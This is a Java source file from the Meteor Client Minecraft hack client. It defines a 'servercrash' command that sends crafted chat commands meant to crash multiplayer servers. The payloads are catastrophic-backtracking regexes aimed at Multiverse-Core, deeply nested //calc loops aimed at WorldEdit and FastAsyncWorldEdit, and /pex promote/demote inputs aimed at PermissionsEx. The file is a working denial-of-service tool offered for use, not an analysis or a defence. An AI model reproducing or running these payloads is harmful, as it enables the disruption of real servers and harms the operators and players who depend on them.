/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client/).
 * Copyright (c) 2021 Meteor Development.
 */

package meteordevelopment.meteorclient.systems.commands.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.systems.commands.Command;
import net.minecraft.command.CommandSource;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class ServerCrashCommand extends Command {

    public ServerCrashCommand() {
        super("servercrash", "Could crash the server");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {

        builder.then(literal("multiverse-core-v1").executes(ctx -> {
            if (mc.player != null && mc.player.networkHandler != null) {
                mc.player.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            }
            return SINGLE_SUCCESS;
        }));
        builder.then(literal("multiverse-core-v2").executes(ctx -> {
            if (mc.player != null && mc.player.networkHandler != null) {
                mc.player.sendChatMessage("/mvhelp ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            }
            return SINGLE_SUCCESS;
        }));
        builder.then(literal("multiverse-core-v3").executes(ctx -> {
            if (mc.player != null && mc.player.networkHandler != null) {
                mc.player.sendChatMessage("/mv ^(.*?R.*.*.*.*.*.?E*.?.*?R)^");
            }
            return SINGLE_SUCCESS;
        }));
        builder.then(literal("multiverse-core-v4").executes(ctx -> {
            if (mc.player != null && mc.player.networkHandler != null) {
                mc.player.sendChatMessage("/mv ^(*.?E?E?E?E?.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            }
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("world-edit-v1").executes(ctx -> {
            if (mc.player != null && mc.player.networkHandler != null) {
                mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){for(m=0;m<256;m++){ln(pi)}}}}}");
            }
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("fast-async-world-edit-v1").executes(ctx -> {
            if (mc.player != null && mc.player.networkHandler != null) {
                mc.player.sendChatMessage("/to for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){ln(pi)}}}}");
            }
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("permissions-ex-v1").executes(ctx -> {
            if (mc.player != null && mc.player.networkHandler != null) {
                mc.player.sendChatMessage("/pex promote a a");
            }
            return SINGLE_SUCCESS;
        }));
        builder.then(literal("permissions-ex-v2").executes(ctx -> {
            if (mc.player != null && mc.player.networkHandler != null) {
                mc.player.sendChatMessage("/pex demote a a");
            }
            return SINGLE_SUCCESS;
        }));

    }

}
